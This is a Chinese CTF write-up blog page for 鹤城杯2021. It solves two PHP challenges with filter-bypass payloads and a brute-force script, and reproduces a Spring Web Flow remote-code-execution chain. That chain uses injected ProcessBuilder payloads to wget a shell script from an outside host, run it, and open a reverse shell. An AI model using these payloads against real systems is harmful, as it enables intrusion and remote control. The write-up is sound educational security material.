@@ -1,0 +1,295 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>鹤城杯2021 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="MIDDLE_MAGIC &amp;lt;?php
+    highlight_file(__FILE__);
+    include &#34;./flag.php&#34;;
+    include &#34;./result,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">鹤城杯2021</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">鹤城杯2021</h1>
+        <div class="stuff">
+            <span>十月 08, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="MIDDLE-MAGIC"><a href="#MIDDLE-MAGIC" class="headerlink" title="MIDDLE_MAGIC"></a>MIDDLE_MAGIC</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">"./result.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token string">'${1}&lt;!-- filtered -->${2}'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"here is level 2"</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    <span class="token keyword">echo</span> <span class="token string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// START FORM PROCESSING    </span>
+                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token keyword">echo</span> <span class="token string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+                            <span class="token keyword">echo</span> <span class="token string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">echo</span> <span class="token string">"you never beat me!"</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                    <span class="token keyword">else</span><span class="token punctuation">{</span>
+                        <span class="token keyword">echo</span> <span class="token string">"out"</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">else</span><span class="token punctuation">{</span>
+
+                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">// perform validations on the form data</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">'nonono!'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token delimiter">?></span> </code></pre>
+<ul>
+<li>%0a绕过preg_replace</li>
+<li>数组绕过sha1</li>
+<li>若比较=0绕过json_decode</li>
+</ul>
+<p><strong>payload</strong></p>
+<pre><code>?aaa=%0apass_the_level_1#
+POST:
+admin[]=1&amp;root_pwd[]=2&amp;level_3={"result":0}</code></pre>
+<h1 id="EASYP"><a href="#EASYP" class="headerlink" title="EASYP"></a>EASYP</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'utils.php'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong. Try Again'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/utils\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/show_source/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> </code></pre>
+<p> 大E了太久了忘了：</p>
+<p>原题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP">https://buuoj.cn/challenges#[ISITDTU%202019]EasyPHP</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/1898.html">https://www.gem-love.com/ctf/1898.html</a></p>
+<p><code>basename()</code> 是为了跨目录读文件</p>
+<pre><code>#Author:颖奇L'Amore www.gem-love.com
+import requests
+for i in range (0,500):
+    url = 'http://3.112.201.75:8003/index.php/config.php/{}?source'.format(hex(i).replace('0x', '%'))
+    r = requests.get(url)
+    if r"zer0pts" in r.text:
+        print(url)
+        print(r.content)
+        break</code></pre>
+<pre><code>%81?%73%68%6f%77%5f%73%6f%75%72%63%65=1</code></pre>
+<h1 id="Spring-Xman2017原题"><a href="#Spring-Xman2017原题" class="headerlink" title="Spring(Xman2017原题)"></a>Spring(Xman2017原题)</h1><p>反弹shell</p>
+<p><a target="_blank" rel="noopener" href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
+<p>1.点击页面中的超链接进入图书搜索页面，在页面中输入搜索内容进行搜索</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/1.png" alt="1"></p>
+<p>2.搜索到图书点击View hotel按钮，然后点击Book hotel按钮，如果没有登录请先登录（登录名密码圈出来了，4种任意都可以登录）</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/2.png" alt="2"></p>
+<p>3.进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/3.png" alt="3"></p>
+<p>4.在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：<code>&amp;_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei</code>，shell.sh放在可以访问的服务器中，执行请求包。</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/4.png" alt="4"></p>
+<p>5.查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/5.png" alt="5"></p>
+<p>6.至此已经复现了漏洞，可是我们既然想代码执行，那我们就可以进行反弹shell操作，继续执行命令，添加payload：<code>&amp;_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei</code>对shell.sh修改权限</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/6.png" alt="6"></p>
+<p>7.查看虚拟机中的/tmp目录下的shell.sh有没有变成可读可写可执行权限，可以看到shell.sh权限成功变成777</p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/7.png" alt="7"></p>
+<p>8.执行shell.sh文件同时监听2333端口，执行payload:<code>&amp;_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei</code></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/8.png" alt="8"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/9.png" alt="9"></p>
+<p>9.在监听的服务器中查看监听的2333端口有没有反弹shell，可以看到成功反弹shell，可以执行权限内任意命令。 </p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/10.png" alt="10"></p>
+<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>  升级Spring Web Flow版本到4.2.5</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MIDDLE-MAGIC"><span class="toc-number">1.</span> <span class="toc-text">MIDDLE_MAGIC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EASYP"><span class="toc-number">2.</span> <span class="toc-text">EASYP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-Xman2017%E5%8E%9F%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">Spring(Xman2017原题)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%84%8F%E8%A7%81"><span class="toc-number">3.1.</span> <span class="toc-text">修复意见</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
